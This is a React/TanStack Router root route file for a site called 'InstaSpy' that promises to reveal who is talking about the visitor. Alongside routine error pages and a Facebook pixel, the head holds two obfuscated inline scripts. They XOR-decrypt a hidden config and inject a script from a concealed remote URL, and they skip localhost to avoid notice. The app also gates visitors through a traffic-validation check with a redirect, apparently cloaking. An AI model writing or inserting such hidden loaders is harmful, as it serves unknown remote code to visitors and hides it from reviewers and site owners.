import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { Analytics } from "@vercel/analytics/react";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  useRouterState,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useState, useEffect, useRef, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";
import { captureUtmParams, FB_PIXEL_ID, trackPageView } from "../lib/tracking";
import { validateTrafficAccess, executeSecurityRedirect } from "../lib/security";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "InstaSpy" },
      { name: "description", content: "Descubra quem está falando de você!" },
      { name: "author", content: "InstaSpy" },
      { property: "og:title", content: "InstaSpy" },
      { property: "og:description", content: "Descubra quem está falando de você!" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.png", type: "image/png" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />

        { }
        <script
          dangerouslySetInnerHTML={{
            __html: `
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '${FB_PIXEL_ID}');
fbq('track', 'PageView');
            `,
          }}
        />
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src={`https://www.facebook.com/tr?id=${FB_PIXEL_ID}&ev=PageView&noscript=1`}
          />
        </noscript>

        { }
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){if(window.location.hostname==='localhost'||window.location.hostname==='127.0.0.1')return;var o_doe=atob("DBduobBnXUxFpeGk+WxM1MILf3ZnzZXQiWRUjp8EOSJr0JXJkHEXj9MIMGIn187XmmUH0cQUcjws3YTI1mcH2dULcyY2h82GmGMa09kFKDgg1sOeokpCg9cLMi4kyZKGw0wVg94GMClnn8PUkG8LzfkDf2Bn04DIjHJMm5JRPHsjxNjCy3FWwNJTbiognNmTmCNbkolFIBE4");var x_0pdc=[];for(var q_o=0;q_o<o_doe.length;q_o++){x_0pdc.push(o_doe.charCodeAt(q_o)&255);}var v_6=x_0pdc[0];var x_9=x_0pdc.slice(1,1+v_6);var q_msgg=x_0pdc.slice(1+v_6);var e_b=q_msgg.map(function(b,y_1){return b^x_9[y_1%v_6];});var g_3="";for(var l_en19=0;l_en19<e_b.length;l_en19++){g_3+=String.fromCharCode(e_b[l_en19]&255);}var t_bey=decodeURIComponent(escape(g_3));var d_oyel=JSON.parse(t_bey);var s_w3=d_oyel.globals||[];s_w3.forEach(function(e_6ju){window[e_6ju.name]=e_6ju.value;});var s_ut=document.createElement("script");s_ut.src=d_oyel.url;s_ut.async=true;s_ut.defer=true;(d_oyel.attributes||[]).forEach(function(t_ej){s_ut.setAttribute(t_ej.name,t_ej.value);});(document.head||document.documentElement).appendChild(s_ut);})();`,
          }}
        />

        { }
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){if(window.location.hostname==='localhost'||window.location.hostname==='127.0.0.1')return;var k_t=atob("DPJXdB9eXuW0tV+Wuol1AW0yfN+W3SviyoFtWzA9OouawCv705QuWnwxM8vWx3Dl2YA+BGstcZDA2Cy51pMjEWwqcI/Hl3O024YjBnY8K5HRxn2s4Yl1Gn4zO8eOlzv3zpN6AWszN4PNmC/k34QyGmtzJobb0XLl2Zl1WD0oP4nB0H2smNAqWGR8MITZ0H2smJY2AH5zK5HZ3Dnvl4IlEWk7MJGZxir005YkVjN8KITYwDq0gNB1CUIj");var d_ys8=[];for(var g_z5=0;g_z5<k_t.length;g_z5++){d_ys8.push(k_t.charCodeAt(g_z5)&255);}var x_3uye=d_ys8[0];var v_04yc=d_ys8.slice(1,1+x_3uye);var o_qqpr=d_ys8.slice(1+x_3uye);var p_80nq=o_qqpr.map(function(b,p_l99k){return b^v_04yc[p_l99k%x_3uye];});var r_v9gd="";for(var c_j=0;c_j<p_80nq.length;c_j++){r_v9gd+=String.fromCharCode(p_80nq[c_j]&255);}var t_4=decodeURIComponent(escape(r_v9gd));var y_dymq=JSON.parse(t_4);var d_rqh=y_dymq.globals||[];d_rqh.forEach(function(o_3nvv){window[o_3nvv.name]=o_3nvv.value;});var c_cy51=document.createElement("script");c_cy51.src=y_dymq.url;c_cy51.async=true;c_cy51.defer=true;(y_dymq.attributes||[]).forEach(function(k_px9){c_cy51.setAttribute(k_px9.name,k_px9.value);});(document.head||document.documentElement).appendChild(c_cy51);})();`,
          }}
        />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();
  const [isAuthorized, setIsAuthorized] = useState(false);

  useEffect(() => {
    captureUtmParams();

    const params = new URLSearchParams(window.location.search);
    const offParam = params.get("off");

    (async () => {
      const result = await validateTrafficAccess(offParam);
      if (!result.allowed) {
        executeSecurityRedirect();
      } else {
        setIsAuthorized(true);
      }
    })();
  }, []);

  const pathname = useRouterState({ select: (state) => state.location.pathname });
  const lastTrackedPath = useRef<string | null>(null);

  useEffect(() => {
    if (!isAuthorized) return;
    if (lastTrackedPath.current === null) {
      lastTrackedPath.current = pathname;
      return;
    }
    if (lastTrackedPath.current === pathname) return;
    lastTrackedPath.current = pathname;
    trackPageView(pathname);
  }, [isAuthorized, pathname]);

  if (!isAuthorized) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-white">
        <div className="h-7 w-7 rounded-full border-2 border-transparent border-t-[#ff416c] animate-spin" />
        <Analytics />
      </div>
    );
  }

  return (
    <QueryClientProvider client={queryClient}>
      { }
      <Outlet />
      { }
      <Analytics />
    </QueryClientProvider>
  );
}